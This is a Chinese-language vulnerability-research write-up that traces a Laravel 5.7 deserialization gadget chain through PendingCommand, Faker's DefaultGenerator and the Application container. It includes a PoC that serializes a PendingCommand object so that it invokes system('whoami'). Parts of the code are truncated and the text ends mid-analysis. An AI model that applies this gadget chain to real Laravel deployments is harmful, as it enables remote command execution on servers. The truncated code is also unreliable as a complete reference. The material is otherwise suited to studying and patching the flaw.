# 环境搭建
版本:Laravel5.7
PHPstudy+PHP7.3.5（PHP >= 7.1.3）
直接用composer安装
    composer create-project laravel/laravel=5.7 laravel5-7 --prefer-dist
php artisan serve启动
接下来添加路由
routes\web.php下添加一个index路由
    Route::get("/index","\App\Http\Controllers\TestController@demo");
app\Http\Controllers下新建一个TestController.php控制器
    hasExecuted的默认值是false
那这里就可以直接调用run()方法
跟进run()
    public function run()
    {
        $this->hasExecuted = true;
        $this->mockConsoleOutput();
        try {
            $exitCode = $this->app[Kernel::class]->call($this->command, $this->parameters);
        } catch (NoMatchingExpectationException $e) {
            if ($e->getMethodName() === 'askQuestion') {
                $this->test->fail('Unexpected question "'.$e->getActualArguments()[0]->getQuestion().'" was asked.');
            }
            throw $e;
        }
        if ($this->expectedExitCode !== null) {
            $this->test->assertEquals(
                $this->expectedExitCode, $exitCode,
                "Expected status code {$this->expectedExitCode} but received {$exitCode}."
            );
        }
        return $exitCode;
    }
看到一个参数可控的调用
    $exitCode = $this->app[Kernel::class]->call($this->command, $this->parameters)
不过在此之前调用了一个mockConsoleOutput函数,跟进看看
    protected function mockConsoleOutput()
    {
        $mock = Mockery::mock(OutputStyle::class.'[askQuestion]', [
            (new ArrayInput($this->parameters)), $this->createABufferedOutputMock(),
        ]);
        foreach ($this->test->expectedQuestions as $i => $question) {
            $mock->shouldReceive('askQuestion')
                ->once()
                ->ordered()
                ->with(Mockery::on(function ($argument) use ($question) {
                    return $argument->getQuestion() == $question[0];
                }))
                ->andReturnUsing(function () use ($question, $i) {
                    unset($this->test->expectedQuestions[$i]);
                    return $question[1];
                });
        }
        $this->app->bind(OutputStyle::class, function () use ($mock) {
            return $mock;
        });
    }
这个Mockery::mock实现了一个对象模拟,但是我们的目的是要走完这段代码,这里用断点调试去单点调试,让他不报错然后回到下面参数可用的调用,不过这里还会调用一个createABufferedOutputMock函数,继续跟进
    private function createABufferedOutputMock()
    {
        $mock = Mockery::mock(BufferedOutput::class.'[doWrite]')
                ->shouldAllowMockingProtectedMethods()
                ->shouldIgnoreMissing();
        foreach ($this->test->expectedOutput as $i => $output) {
            $mock->shouldReceive('doWrite')
                ->once()
                ->ordered()
                ->with($output, Mockery::any())
                ->andReturnUsing(function () use ($i) {
                    unset($this->test->expectedOutput[$i]);
                });
        }
        return $mock;
    }
又实现了一次对象模拟,我们的目的还是为了走完这段代码,继续往下看,进入foreach
里面的$this->test->expectedOutput这里的$this->test可控,去调用任意类的expectedOutput属性,或者去调用__get()魔术方法,随便选取一个可用的get方法就行,这里可以用DefaultGenerator.php类或者Illuminate\Auth\GenericUser类,这个就很多了,只要找到个可用的就行
DefaultGenerator.php
GenericUser.php
随便用一个就行,只是要注意这里是foreach,所以我们要返回一个数组
$this->default=['T0WN'=>"hacker"]或者$this->attributes['expectedOutput']=1
回到mockConsoleOutput方法，也进入了应该foreach循环
这里的绕过方法和刚才一样去调用get方法,为了一次性控制,我就采用DefaultGenerator.php的get方法,然后走完这段代码回到run方法
但是这里的$this->app需要赋值为一个类,不然会报错
在注释中说了这里的是应该为\Illuminate\Foundation\Application类
接下来就是产生漏洞的关键代码
    $exitCode = $this->app[Kernel::class]->call($this->command, $this->parameters);
Kernel::class是完全限定名称，返回的是一个类的完整的带上命名空间的类名
Kernel::class在这里是一个固定值Illuminate\Contracts\Console\Kernel,去调用$this->app[Kernel::class]里面的call函数
这段代码有点晦涩,先写一个poc试试,然后再来单点调试
    app = $app;
                $this->test = $test;
                $this->command = $command;
                $this->parameters = $parameters;
            }
        }
    }
    namespace Faker {
        class DefaultGenerator
        {
            protected $default;
            public function __construct($default = null)
            {
                $this->default = $default;
            }
        }
    }
    namespace Illuminate\Foundation {
        class Application
        {
            public function __construct($instances = [])
            {
            }
        }
    }
    namespace {
        $defaultgenerator = new Faker\DefaultGenerator(array("T0WN" => "1"));
        $application = new Illuminate\Foundation\Application();
        $pendingcommand = new Illuminate\Foundation\Testing\PendingCommand($defaultgenerator, $application, "system", array("whoami"));
        echo urlencode(serialize($pendingcommand));
    }
利用上面的poc这里走到了这段代码
    $exitCode = $this->app[Kernel::class]->call($this->command, $this->parameters);
但是再f8往下走就直接抛出异常了
所以就f7跟进看看调用栈是怎么样的,来到了offsetGet函数
或者直接跟进$this->app[Kernel::class]这段代码
跟进make
    public function make($abstract, array $parameters = [])
    {
        $abstract = $this->getAlias($abstract);
        if (isset($this->deferredServices[$abstract]) && ! isset($this->instances[$abstract])) {
            $this->loadDeferredProvider($abstract);
        }
        return parent::make($abstract, $parameters);
    }
跟进其父类的make
    public function make($abstract, array $parameters = [])
    {
        return $this->resolve($abstract, $parameters);
    }
上面这些函数都没什么可控点
跟进resolve
    protected function resolve($abstract, $parameters = [])
    {
        $abstract = $this->getAlias($abstract);
        $needsContextualBuild = ! empty($parameters) || ! is_null(
            $this->getContextualConcrete($abstract)
        );
        // If an instance of the type is currently being managed as a singleton we'll
        // just return an existing instance instead of instantiating new instances
        // so the developer can keep using the same objects instance every time.
        if (isset($this->instances[$abstract]) && ! $needsContextualBuild) {
            return $this->instances[$abstract];
        }
        $this->with[] = $parameters;
        $concrete = $this->getConcrete($abstract);
        ......
一直跟到resolve的这没报错,但是继续单步调试又报错了
那就接着跟进build函数
在里面的这个地方报错了
if判断这个类是否能够实例化,当前类是不能实例化的
可用看看Kernel类的定义
    interface Kernel
定义为一个接口类,可用在PHP官方文档看到一个例子的输出
我们看输出效果就知道了,接口类和抽象类还有构造方法私有的类是不能实例化的,接口类的子类,抽象类的继承类是可以实例化的
所以这里进入了这个if判断
跟进notInstantiable
    protected function notInstantiable($concrete)